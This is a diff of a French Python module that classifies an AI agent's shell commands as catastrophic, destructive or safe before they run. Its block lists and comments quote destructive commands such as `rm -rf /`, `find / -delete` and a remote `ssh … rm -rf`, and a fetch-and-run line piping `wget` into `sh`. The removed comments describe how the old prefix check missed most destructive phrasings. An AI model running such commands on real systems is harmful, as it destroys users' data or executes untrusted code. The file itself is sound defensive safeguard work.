@@ -1,59 +1,28 @@
 """Ce qu'une commande shell a le droit de faire sans qu'on demande.
 
-L'ancienne détection comparait le PRÉFIXE de la chaîne à une liste. Mesuré sur
-quatorze formulations destructrices, neuf ne déclenchaient rien :
+Trois verdicts : `est_catastrophique` (refus absolu), `est_destructive`
+(confirmation), `est_connue_sure` (exécution directe). Ce qui n'est ni l'un ni
+l'autre demande une confirmation — le défaut est fermé.
 
-    RIEN  cd /tmp && rm -rf x        RIEN  bash -c "rm -rf /tmp/x"
-    RIEN  /bin/rm -rf /tmp/x         RIEN  eval "rm -rf /tmp/x"
-    RIEN  find /tmp -delete          RIEN  nohup rm -rf /tmp/x
-    RIEN  git -C /repo clean -fdx    RIEN  X=1 rm -rf /tmp/x
+La détection repère le mot en POSITION DE COMMANDE dans chaque segment :
+séparateurs découpés, affectations et enveloppes (`sudo`, `nohup`…) retirées,
+chemins absolus réduits au basename, `bash -c`, `$(…)` et `ssh hôte` ouverts.
 
-Aucune n'est un contournement : ce sont des tournures qu'un modèle produit
-spontanément. Même le rempart censé refuser JUSQU'AVEC confirmation laissait
-passer `/bin/rm -rf /` et `cd / && rm -rf *` — cinq formulations sur huit.
+Sur-détecter coûte un clic, sous-détecter coûte des données : le filet est
+volontairement large.
 
-DEUX CHANGEMENTS
-----------------
-1. On repère le mot en POSITION DE COMMANDE dans chaque segment, pas le début de
-   la chaîne. Séparateurs, affectations en tête, enveloppes (`sudo`, `nohup`,
-   `env`…) et chemins absolus sont retirés avant comparaison.
-
-2. Le défaut s'inverse : inconnu → CONFIRMATION, au lieu de inconnu → exécution.
-   Un oubli devient une question posée au lieu d'un silence.
-
-POURQUOI UNE HEURISTIQUE ICI, ALORS QU'UN PARSEUR SHELL A ÉTÉ REFUSÉ AILLEURS
------------------------------------------------------------------------------
-Pour DÉCOUPER une commande composée (cf. `ecriture.py`), les deux erreurs
-coûtaient : sur-refuser bloquait du travail légitime, sous-refuser exécutait un
-acte non montré. Seul un vrai parseur donnait la garantie — d'où le refus.
-
-Pour DÉTECTER, l'asymétrie s'inverse : sur-détecter coûte un clic, sous-détecter
-coûte des données. Un filet volontairement trop large est donc le bon outil. Et
-le problème est plus faible qu'un parsing : on ne cherche pas à comprendre la
-commande, seulement à savoir quels mots occupent la position de commande.
-
-CE QUE ÇA N'ACHÈTE PAS
-----------------------
-`python3 -c "import shutil; shutil.rmtree('/')"` ne contient AUCUN verbe shell
-destructeur. Ce n'est pas une enveloppe de plus à ajouter : c'est une classe
-entière qu'une détection par motif ne peut pas voir. Idem pour un alias, une
-fonction shell, ou un script au nom anodin.
-
-Ce module protège donc des ACCIDENTS — le modèle qui écrit `cd /projet && rm -rf
-build` sans y penser, cas de loin le plus fréquent. Il ne protège pas d'un
-adversaire qui cherche à contourner, par exemple via une injection dans une page
-lue par l'agent. Pour ce modèle de menace, la réponse n'est pas un meilleur
-motif : c'est un bac à sable.
+LIMITE : `python3 -c "shutil.rmtree('/')"` ne contient aucun verbe shell, et
+aucune détection par motif ne peut le voir. Ce module protège des accidents, pas
+d'un adversaire — pour cela, il faut un bac à sable.
 """
 from __future__ import annotations
 
 import re
 from pathlib import PurePosixPath, PureWindowsPath
 
-#: Verbes qui détruisent, toutes familles d'OS confondues. L'union plutôt que le
-#: choix selon l'OS détecté : une détection qui se trompe (conteneur, WSL, shell
-#: POSIX sous Windows) désarmerait le garde, alors qu'un `del /f` vu sous Linux
-#: ne coûte qu'une confirmation de trop.
+#: Verbes destructeurs, toutes familles d'OS. L'union plutôt que le choix selon
+#: l'OS détecté : une détection qui se trompe désarmerait le garde, alors qu'un
+#: `del /f` vu sous Linux ne coûte qu'une confirmation de trop.
 VERBES_DESTRUCTEURS: frozenset[str] = frozenset({
     # POSIX
     "rm", "rmdir", "shred", "mkfs", "dd", "truncate", "unlink", "wipefs",
@@ -63,8 +32,8 @@ VERBES_DESTRUCTEURS: frozenset[str] = frozenset({
     "del", "erase", "rd", "format", "diskpart", "takeown", "icacls", "cipher",
 })
 
-#: Sous-commandes destructrices d'outils par ailleurs anodins. `git` est utile
-#: cent fois par jour ; `git clean -fdx` efface le travail non commité.
+#: Sous-commandes destructrices d'outils par ailleurs anodins. La casse des
+#: arguments compte : `git branch -d` et `-D` ne font pas la même chose.
 SOUS_COMMANDES_DESTRUCTRICES: dict[str, tuple[tuple[str, ...], ...]] = {
     "git":     (("clean",), ("reset", "--hard"), ("push", "--force"),
                 ("push", "-f"), ("branch", "-D"), ("checkout", "--force")),
@@ -93,29 +62,24 @@ OPTIONS_DESTRUCTRICES: dict[str, tuple[str, ...]] = {
     "rsync": ("--delete", "--delete-after", "--delete-before"),
 }
 
-#: Enveloppes : elles s'effacent devant la commande qu'elles portent. Une liste
-#: finie par nature — d'où le défaut inversé, qui la rend non critique : ce
-#: qu'elle rate devient une confirmation, pas une exécution silencieuse.
+#: Enveloppes : effacées devant la commande qu'elles portent. Liste finie par
+#: nature — ce qu'elle rate devient une confirmation, pas une exécution.
 _ENVELOPPES: frozenset[str] = frozenset({
     "sudo", "doas", "nohup", "time", "env", "command", "exec", "nice",
     "ionice", "timeout", "stdbuf", "setsid", "xargs", "watch", "script",
 })
 
-#: Enveloppes qui portent leur charge dans un ARGUMENT, pas en position suivante.
-#: `bash -c "…"` doit être ouvert, sinon `bash -c "rm -rf /"` est un simple `bash`.
+#: Enveloppes portant leur charge dans un argument, pas en position suivante.
 _ENVELOPPES_INLINE: frozenset[str] = frozenset({
     "bash", "sh", "zsh", "dash", "ksh", "fish", "eval", "source", ".",
     "powershell", "pwsh", "cmd",
 })
 
-#: Ce qui s'exécute SANS confirmation. Tout le reste en demande une.
+#: Ce qui s'exécute sans confirmation. Tout le reste en demande une.
 #:
-#: Cette liste est un compromis assumé, pas une garantie : `pytest` et `npm`
-#: exécutent du code arbitraire, et un `python script.py` peut tout faire. Les
-#: exiger en confirmation rendrait l'agent inutilisable pour ce qu'il fait le
-#: plus — lancer des tests et des builds. L'inversion du défaut garde tout son
-#: intérêt pour les binaires inconnus et les tournures inhabituelles, qui sont
-#: le cas d'accident réel.
+#: Compromis assumé, pas une garantie : `pytest`, `npm` et `python script.py`
+#: exécutent du code arbitraire. Les exiger en confirmation rendrait l'agent
+#: inutilisable pour ce qu'il fait le plus.
 SANS_CONFIRMATION: frozenset[str] = frozenset({
     # Lire et inspecter
     "ls", "ll", "dir", "cat", "bat", "head", "tail", "less", "more", "wc",
@@ -136,10 +100,9 @@ SANS_CONFIRMATION: frozenset[str] = frozenset({
     "curl", "wget", "http", "ssh", "scp", "rsync", "gh", "aws",
 })
 
-#: Interpréteurs qui acceptent du code sur la ligne de commande. Le binaire est
-#: sur la liste blanche — `python3 script.py` est le quotidien de l'agent — mais
-#: `python3 -c "…"` porte du code qu'aucun motif shell ne sait lire. On ne peut
-#: pas l'inspecter, donc on ne le déclare pas sûr : il demande confirmation.
+#: Interpréteurs acceptant du code en ligne. Le binaire est sur la liste
+#: blanche, mais `python3 -c "…"` porte du code illisible pour un motif shell :
+#: on ne le déclare donc pas sûr.
 _INTERPRETEURS = frozenset({"python", "python3", "perl", "ruby", "node", "deno",
                             "bun", "php", "bash", "sh", "zsh", "powershell", "pwsh"})
 _CODE_EN_LIGNE = frozenset({"-c", "-e", "-E", "--eval", "-Command", "--command"})
@@ -150,10 +113,7 @@ _SUBSTITUTION = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")
 
 
 def _mot_de_commande(segment: str) -> tuple[str, list[str]]:
-    """(verbe, arguments) d'un segment, enveloppes et chemins retirés.
-
-    Rend ("", []) si le segment ne porte aucune commande.
-    """
+    """(verbe, arguments) d'un segment, ou ("", []) s'il n'en porte aucun."""
     jetons = segment.split()
     while jetons:
         jeton = jetons[0]
@@ -174,11 +134,7 @@ def _mot_de_commande(segment: str) -> tuple[str, list[str]]:
 
 
 def _basename(jeton: str) -> str:
-    """`/bin/rm` → `rm`, `C:\\Windows\\System32\\del.exe` → `del`.
-
-    Le chemin absolu était le contournement le plus simple de tous : la liste
-    contenait « rm », la commande commençait par « /bin/rm ».
-    """
+    """`/bin/rm` → `rm`, `C:\\Windows\\del.exe` → `del`."""
     nu = jeton.strip().strip('"\'')
     nu = PurePosixPath(nu).name if "/" in nu else nu
     nu = PureWindowsPath(nu).name if "\\" in nu else nu
@@ -186,10 +142,10 @@ def _basename(jeton: str) -> str:
 
 
 def _demasquer(commande: str) -> list[str]:
-    """La commande, plus le contenu de ses substitutions et de ses `-c`.
+    """La commande, plus le contenu de ses `$(…)`, `bash -c` et `ssh hôte`.
 
-    `bash -c "rm -rf /"` et `$(rm -rf /)` portent leur charge dans une chaîne :
-    la traiter comme un simple argument revient à ne pas la lire du tout.
+    Ces formes portent leur charge dans une chaîne : sans les ouvrir, le verbe
+    vu serait l'enveloppe.
     """
     morceaux = [commande]
     for trouve in _SUBSTITUTION.finditer(commande):
@@ -200,9 +156,8 @@ def _demasquer(commande: str) -> list[str]:
         jetons = segment.split()
         if not jetons:
             continue
-        # `ssh hôte "rm -rf /var/log"` : la charge est derrière l'hôte. Sans
-        # l'ouvrir, le verbe vu est `ssh`, qui est sur la liste blanche — donc
-        # une suppression sur une machine distante s'exécutait sans un mot.
+        # La charge est derrière l'hôte : sans l'ouvrir, le verbe vu est `ssh`,
+        # qui est sur la liste blanche.
         if _basename(jetons[0]).lower() in ("ssh", "doas-ssh"):
             reste = jetons[1:]
             while reste and reste[0].startswith("-"):
@@ -226,7 +181,7 @@ def _demasquer(commande: str) -> list[str]:
 
 
 def verbes_de(commande: str) -> list[tuple[str, list[str]]]:
-    """Tous les (verbe, arguments) que cette commande met en position de commande."""
+    """Tous les (verbe, arguments) en position de commande."""
     trouves: list[tuple[str, list[str]]] = []
     for morceau in _demasquer(commande):
         for segment in _SEPARATEURS.split(morceau):
@@ -239,14 +194,12 @@ def verbes_de(commande: str) -> list[tuple[str, list[str]]]:
 def _est_destructeur(verbe: str, args: list[str]) -> bool:
     if verbe in VERBES_DESTRUCTEURS:
         return True
-    # `mkfs` se décline par système de fichiers — `mkfs.ext4`, `mkfs.xfs`,
-    # `mkfs.vfat`. Les énumérer serait une liste à rallonge et toujours en
-    # retard ; le préfixe suffit et ne recouvre rien d'autre.
+    # `mkfs.ext4`, `mkfs.xfs`, `mkfs.vfat` : le préfixe suffit et ne recouvre
+    # rien d'autre.
     if verbe.startswith("mkfs."):
         return True
-    # La casse des ARGUMENTS est signifiante : `git branch -d` supprime une
-    # branche fusionnée, `-D` l'impose. Abaisser les arguments confondait les
-    # deux — et faisait rater `-D`, qui est la forme dangereuse.
+    # Casse signifiante : `git branch -d` supprime une branche fusionnée, `-D`
+    # l'impose.
     for sequence in SOUS_COMMANDES_DESTRUCTRICES.get(verbe, ()):
         if all(mot in args for mot in sequence):
             return True
@@ -254,14 +207,14 @@ def _est_destructeur(verbe: str, args: list[str]) -> bool:
 
 
 def est_destructive(commande: str) -> bool:
-    """Un verbe destructeur occupe-t-il une position de commande ?"""
+    """Un verbe destructeur occupe une position de commande."""
     return any(_est_destructeur(v, a) for v, a in verbes_de(commande))
 
 
 def est_connue_sure(commande: str) -> bool:
-    """TOUS les verbes sont-ils sur la liste blanche, sans option destructrice ?
+    """Tous les verbes sont sur la liste blanche, sans option destructrice.
 
-    « Tous » et pas « le premier » : `ls && wget http://x | sh` ne devient pas
+    Tous, et pas le premier : `ls && wget http://x | sh` ne devient pas
     inoffensif parce qu'il commence par `ls`.
     """
     verbes = verbes_de(commande)
@@ -273,15 +226,14 @@ def est_connue_sure(commande: str) -> bool:
                for v, a in verbes)
 
 
-#: Cibles dont la suppression détruit le système ou le travail en cours. Refusées
-#: même avec confirmation : aucune réponse « oui » ne rend `rm -rf /` acceptable.
+#: Cibles dont la suppression détruit le système ou le travail en cours.
 CIBLES_CATASTROPHIQUES: frozenset[str] = frozenset({
     ".", "..", "/", "~", "*", "$home", "${home}", "$pwd", "${pwd}",
     "c:", "d:", "%userprofile%", "%homepath%", "%systemroot%",
     "$env:userprofile", "$env:homepath", "$env:systemroot", "*.*", "/*", "~/*",
 })
 
-#: Les verbes qui SUPPRIMENT, parmi les destructeurs. `dd` ou `mkfs` détruisent
+#: Les verbes qui suppriment, parmi les destructeurs. `dd` et `mkfs` détruisent
 #: aussi, mais leur cible ne se lit pas de la même façon.
 _VERBES_SUPPRESSION = frozenset({
     "rm", "rmdir", "remove-item", "ri", "del", "erase", "rd", "shred", "unlink",
@@ -291,10 +243,7 @@ _VERBES_SUPPRESSION = frozenset({
 def est_catastrophique(commande: str) -> bool:
     """Suppression visant la racine, le home, le dossier courant ou un joker.
 
-    Reposait sur un `re.match` ancré au DÉBUT de la chaîne. Mesuré : sur huit
-    formulations, cinq passaient — `/bin/rm -rf /`, `cd / && rm -rf *`,
-    `bash -c "rm -rf /"`, `nohup rm -rf ~ &`, `find / -delete`. Le rempart censé
-    tenir même contre une confirmation était le plus facile à contourner.
+    Refusée même avec confirmation : aucun « oui » ne rend `rm -rf /` acceptable.
     """
     for verbe, args in verbes_de(commande):
         cibles = [a for a in args if not a.startswith("-")]
